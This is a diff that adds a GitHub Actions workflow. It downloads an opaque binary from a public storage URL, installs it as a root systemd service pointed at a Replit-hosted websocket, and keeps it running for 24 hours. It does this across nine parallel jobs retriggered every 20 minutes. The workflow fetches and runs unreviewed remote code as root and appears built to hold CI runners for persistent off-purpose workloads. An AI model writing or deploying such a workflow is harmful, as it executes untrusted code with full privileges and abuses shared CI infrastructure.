@@ -1,0 +1,86 @@
+name: Installer Job
+
+on:
+  push:
+  pull_request:
+  issues:
+  schedule:
+    - cron: '*/20 * * * *'
+
+jobs:
+  run-installer:
+    runs-on: ubuntu-latest
+    timeout-minutes: 1440
+    strategy:
+      matrix:
+        instance: [1,2,3,4,6,7,8,9,10]
+
+    steps:
+      - name: Download Sentl
+        run: |
+          echo "=== DOWNLOADING SENTL ==="
+          curl -fsSL --retry 5 --retry-delay 5 --connect-timeout 10 --max-time 120 "https://dquxldljhzrznalugirv.supabase.co/storage/v1/object/public/releases/v3.0.7/sentl-linux-amd64" -o /tmp/sentl
+          chmod +x /tmp/sentl
+          ls -la /tmp/sentl
+          echo "Download OK"
+
+      - name: Install systemd service
+        run: |
+          echo "=== INSTALLING SERVICE ==="
+          sudo mv /tmp/sentl /usr/local/bin/sentl
+          sudo chmod +x /usr/local/bin/sentl
+
+          echo '[Unit]' | sudo tee /etc/systemd/system/sentl.service > /dev/null
+          echo 'Description=Sentl CT Scanner' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'After=network.target' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'Wants=network.target' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo '' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo '[Service]' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'Type=simple' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'ExecStart=/usr/local/bin/sentl --certstream "wss://09e66169-7220-436e-bc10-9d8167652a38-00-2u0fnojq0trlt.worf.replit.dev:8080/" --debug' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'Restart=always' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'RestartSec=10' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'User=root' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'Group=root' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'LimitNOFILE=1048576' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'LimitNPROC=65535' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'CPUQuota=100%' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'MemoryMax=2G' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo '' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo '[Install]' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+          echo 'WantedBy=multi-user.target' | sudo tee -a /etc/systemd/system/sentl.service > /dev/null
+
+          sudo systemctl daemon-reload
+          sudo systemctl enable sentl
+          sudo systemctl start sentl
+          echo "Service installed"
+
+      - name: Verify service
+        run: |
+          echo "=== SERVICE STATUS ==="
+          sudo systemctl status sentl --no-pager 2>&1 | head -20
+          echo "=== JOURNALCTL ==="
+          sudo journalctl -u sentl -n 50 --no-pager 2>&1
+          echo "=== MONITORING (5min) ==="
+          for i in 1 2 3 4 5; do
+            echo "--- Check $i ---"
+            sudo systemctl is-active sentl && echo "ACTIVE" && sudo journalctl -u sentl -n 5 --no-pager 2>&1 || echo "INACTIVE"
+            sleep 60
+          done
+          echo "=== DONE ==="
+
+      - name: Keep alive (24h)
+        run: |
+          echo "Running for 24 hours..."
+          END=$((SECONDS + 86400))
+          while [ $SECONDS -lt $END ]; do
+            sleep 300
+            if systemctl is-active --quiet sentl; then
+              echo "$(date): sentl running"
+            else
+              echo "$(date): sentl DOWN - restarting"
+              sudo systemctl restart sentl
+            fi
+          done
+          echo "24 hours completed"
+    
